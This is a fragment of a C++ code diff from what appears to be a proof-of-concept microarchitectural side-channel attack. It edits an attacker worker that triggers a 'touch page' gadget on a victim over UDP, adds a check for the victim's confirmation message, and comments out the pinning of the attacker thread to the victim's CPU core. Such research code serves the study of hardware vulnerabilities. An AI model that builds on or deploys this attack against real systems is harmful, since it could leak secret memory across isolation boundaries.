@@ -718,7 +718,14 @@ void send_worker_v2(uint16_t port) {
     // Special Case: handle a potential minor page fault:
     if (zero_value_prediciton) {
       // Force a TLB hit by triggering a touch page gadget:
-      touch_page(s, malicious_x);
+      touch_page(s, malicious_x);   // Critical to prevent zero-value prediction!
+
+      // Expect confirmation of gadget from victim (optional):
+      msg& m = reinterpret_cast<msg&>(buf);
+      auto bytes = s.recv(buf, sizeof(buf));
+      if (bytes != sizeof(msg) || m.x != malicious_x || m.fn != FN_TOUCH_PAGE) {
+        std::cerr << "Unexpected touch confirmation..." << std::endl;
+      }
 
       // Retry, doubling the number of measurments:
       measurements *= 2;
@@ -796,10 +803,12 @@ int main(int argc, char* const argv[]) {
   CPU_SET(1, &cpuset);
 
   std::thread t(send_worker_v2, udp_port);
-  int rc = pthread_setaffinity_np(t.native_handle(), sizeof(cpuset), &cpuset);
-  if (rc != 0) {
-    std::cerr << "Error calling pthread_setaffinity_np: " << rc << "\n";
-  }
+
+  // Pin attacker thread to the same core as victim (optional):
+//  int rc = pthread_setaffinity_np(t.native_handle(), sizeof(cpuset), &cpuset);
+//  if (rc != 0) {
+//    std::cerr << "Error calling pthread_setaffinity_np: " << rc << "\n";
+//  }
   t.join(); // wait until exits for now...
 
   return EXIT_SUCCESS;
